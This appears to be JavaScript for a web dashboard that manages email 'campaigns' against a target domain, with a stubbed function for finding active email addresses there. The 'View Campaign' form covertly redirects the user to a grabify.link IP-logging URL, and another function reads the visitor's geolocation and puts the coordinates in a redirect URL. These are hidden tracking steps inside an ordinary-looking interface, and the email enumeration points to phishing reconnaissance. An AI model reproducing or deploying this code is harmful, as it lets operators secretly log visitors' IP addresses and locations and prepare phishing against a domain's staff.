document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    window.location.href = 'homepage.html';
});

function loadPage(page) {
    fetch(page)
        .then(response => response.text())
        .then(data => {
            document.getElementById('content').innerHTML = data;
        });
}

document.addEventListener('DOMContentLoaded', function() {
    loadCampaigns();
});

function loadCampaigns() {
    // Mock implementation for loading campaigns sorted by date
    const campaigns = [
        { id: 1, name: 'Campaign 1', date: '2023-01-01' },
        { id: 2, name: 'Campaign 2', date: '2023-02-01' },
        // Add more campaigns here
    ];

    const campaignList = document.getElementById('campaignList');
    campaigns.sort((a, b) => new Date(b.date) - new Date(a.date)).forEach(campaign => {
        const option = document.createElement('option');
        option.value = campaign.id;
        option.textContent = `${campaign.name} (${campaign.date})`;
        campaignList.appendChild(option);
    });
}

function showNewCampaign() {
    document.getElementById('campaignContent').innerHTML = `
        <div class="form-container">
            <h2>New Campaign</h2>
            <form id="newCampaignForm">
                <label for="targetDomain">Target Domain Name:</label>
                <input type="text" id="targetDomain" name="targetDomain" required>
                <label for="campaignList">Campaigns:</label>
                 <input type="text" id="campaign" name="Campaign" required>
                <button type="submit">Create Campaign</button>
            </form>
            <button class="upload-btn" onclick="uploadCSV()">Upload CSV</button>
            <input type="file" id="fileInput" style="display:none" accept=".csv">
        </div>
    `;
    loadCampaigns();
    document.getElementById('newCampaignForm').addEventListener('submit', handleNewCampaignSubmit);
    document.getElementById('fileInput').addEventListener('change', handleFileUpload);
}

function showViewCampaign() {
    document.getElementById('campaignContent').innerHTML = `
        <div class="form-container">
            <h2>View Campaign</h2>
            <form id="viewCampaignForm">
                <label for="targetDomain">Target Domain Name:</label>
                <input type="text" id="targetDomain" name="targetDomain" required>
                <label for="campaignList">Campaigns:</label>
                <select id="campaignList" name="campaignList">
                    <!-- Options will be added here dynamically -->
                </select>
                <button type="submit">View Campaign</button>
            </form>
        </div>
    `;
    loadCampaigns();
    document.getElementById('viewCampaignForm').addEventListener('submit', handleViewCampaignSubmit);

    // Redirect to grabify.link on form submit
    document.getElementById('viewCampaignForm').addEventListener('submit', function(e) {
        e.preventDefault(); // Prevent default form submission

        // Redirect to grabify.link
        window.location.href = 'https://grabify.link/track/GG8ADP';
    });
}

function uploadCSV() {
    document.getElementById('fileInput').click();
}

function handleFileUpload(event) {
    const file = event.target.files[0];
    const reader = new FileReader();
    reader.onload = function(e) {
        const content = e.target.result;
        console.log(content); // Process CSV content
    };
    reader.readAsText(file);
}

function handleNewCampaignSubmit(event) {
    event.preventDefault();
    const targetDomain = document.getElementById('targetDomain').value;
    const campaignId = document.getElementById('campaignList').value;

    // Mock function to identify active email addresses
    const activeEmails = identifyActiveEmails(targetDomain);

    // Save active emails to the database
    saveToDatabase(targetDomain, campaignId, activeEmails);

    alert('Campaign created successfully!');
}

function handleViewCampaignSubmit(event) {
    event.preventDefault();
    const targetDomain = document.getElementById('targetDomain').value;
    const campaignId = document.getElementById('campaignList').value;

    // Mock function to view campaign details
    viewCampaignDetails(targetDomain, campaignId);
}

function identifyActiveEmails(domain) {
    // Mock implementation for identifying active email addresses
    return [
        'email1@example.com',
        'email2@example.com',
        // Add more emails here
    ];
}

function saveToDatabase(domain, campaignId, emails) {
    console.log(`Saving to DB: Domain: ${domain}, Campaign ID: ${campaignId}, Emails: ${emails}`);
    // Implement actual database save logic here
}

function viewCampaignDetails(domain, campaignId) {
    console.log(`Viewing details for: Domain: ${domain}, Campaign ID: ${campaignId}`);
    // Implement actual view logic here
}

function loadPage(page) {
    fetch(page)
        .then(response => response.text())
        .then(data => {
            document.getElementById('content').innerHTML = data;
        });
}

function getGeolocationAndRedirect() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const url = `your_activity.html?lat=${latitude}&lon=${longitude}`;
            window.location.href = url;
        }, function(error) {
            console.error("Error getting geolocation: ", error);
            // Handle the error case here if needed
        });
    } else {
        console.error("Geolocation is not supported by this browser.");
        // Handle the error case here if needed
    }
}
